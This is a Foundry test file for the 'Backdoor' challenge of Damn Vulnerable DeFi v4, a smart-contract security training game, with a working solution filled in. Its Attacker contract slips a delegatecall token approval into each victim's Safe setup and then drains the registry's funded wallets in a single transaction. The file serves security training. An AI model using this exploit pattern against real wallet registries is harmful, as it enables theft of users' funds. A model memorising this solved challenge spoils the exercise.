// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import { Test, console } from "forge-std/Test.sol";
import { Safe } from "@safe-global/safe-smart-account/contracts/Safe.sol";
import { Enum } from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
import { SafeProxyFactory } from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import { DamnValuableToken } from "../../src/DamnValuableToken.sol";
import { WalletRegistry } from "../../src/backdoor/WalletRegistry.sol";

contract Attacker {
    address player;
    // Must be immutable to enable delegate call
    DamnValuableToken immutable token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    constructor(
        address _player,
        DamnValuableToken _token,
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry
    ) {
        player = _player;
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
    }

    function approve(address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function recovery(address[] memory users, address target) external {
        for (uint256 i = 0; i < users.length; ++i) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory attackCall = abi.encodeCall(
                this.approve,
                (address(this))
            );
            bytes memory initializer = abi.encodeCall(
                singletonCopy.setup,
                (
                    owners,
                    1,
                    address(this),
                    attackCall,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );
            Safe wallet = Safe(
                payable(
                    address(
                        walletFactory.createProxyWithCallback(
                            address(singletonCopy),
                            initializer,
                            0,
                            walletRegistry
                        )
                    )
                )
            );
            token.transferFrom(
                address(wallet),
                target,
                token.balanceOf(address(wallet))
            );
        }
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [
        makeAddr("alice"),
        makeAddr("bob"),
        makeAddr("charlie"),
        makeAddr("david")
    ];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(singletonCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(
            token.balanceOf(address(walletRegistry)),
            AMOUNT_TOKENS_DISTRIBUTED
        );
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(
            player,
            token,
            singletonCopy,
            walletFactory,
            walletRegistry
        );
        attacker.recovery(users, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
